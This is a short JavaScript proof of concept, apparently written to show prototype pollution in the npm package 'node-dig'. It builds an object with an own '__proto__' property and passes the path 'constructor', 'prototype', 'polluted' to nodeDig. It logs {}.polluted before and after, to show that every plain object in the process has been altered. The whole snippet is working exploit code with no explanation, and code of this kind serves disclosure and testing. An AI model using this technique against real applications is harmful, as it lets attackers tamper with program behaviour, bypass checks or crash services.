var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const nodeDig = require('node-dig');
console.log({}.polluted);
nodeDig(obj, [
    'constructor',
    'prototype',
    'polluted'
], 'yes');
console.log({}.polluted);